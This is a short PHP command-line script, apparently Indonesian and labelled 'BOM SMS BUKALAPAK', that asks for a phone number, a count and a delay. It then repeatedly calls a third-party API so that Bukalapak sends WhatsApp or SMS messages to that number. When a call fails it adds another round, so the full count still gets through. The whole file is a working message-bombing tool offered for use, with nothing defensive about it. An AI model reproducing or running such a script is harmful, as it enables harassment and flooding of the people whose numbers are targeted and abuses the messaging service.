<?php
error_reporting(0);
/**
# Copyright (c) 2018 IDSYSTEM404.
# Name        : BOM WA BUKALAPAK
# Author      : Wahyu Arif P
# Version     : v1
# Created 	  : 5 November 2018 | 22:00:12
# Last Update : 5 November 2018 | 22:04:52
# "Hargai Copyright jangan di Ubah!" 
						-Wahyu Arif P
**/
echo "\n\e[1;35m============================[ BOM SMS BUKALAPAK ]==========================\e[0m\r\n";
sleep(1);

echo "\nNomor 		: ";
$no = trim(fgets(STDIN, 1024)); 
echo "\nJumlah 		: ";
$jumlah = trim(fgets(STDIN, 1024));
echo "\nJeda 		: ";
$delay       = rtrim( fgets( STDIN));

echo "\n\e[1;35m+=========================\e[0m[# \e[1;32mPROSES\e[0m #]\e[1;35m=========================+\e[0m\n";

for ($x=1; $x<=$jumlah; $x++) {

/** FUNCTION CURL **/
$idsystem404 = curl_init();$idsystem404 = curl_init();
        curl_setopt($idsystem404, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bukalapak-wa.php?no=".$no);
        curl_setopt($idsystem404, CURLOPT_POST, 1);
        curl_setopt($idsystem404, CURLOPT_POSTFIELDS, 1);
        curl_setopt($idsystem404, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($idsystem404, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($idsystem404, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($idsystem404, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($idsystem404, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
$exec = curl_exec($idsystem404);
if(!curl_errno($idsystem404)){
$info = curl_getinfo($idsystem404);
curl_close($idsystem404);
	if ($exec == "error") {
		$jumlah += 1;
		echo "\n\e[1;31mERROR : Silahkan Periksa Koneksi Internet atau Isi Isian diatas dengan Benar!\e[0m\n";
		flush();
		sleep($delay); /** Delay **/		
	} else {
		echo "$x.] Nomor : [\e[1;34m $no \e[0m] [ \e[1;92mSUCCESS ]\e[0m\n";
		flush();
		sleep($delay); /** Delay **/
	}
}
}
?>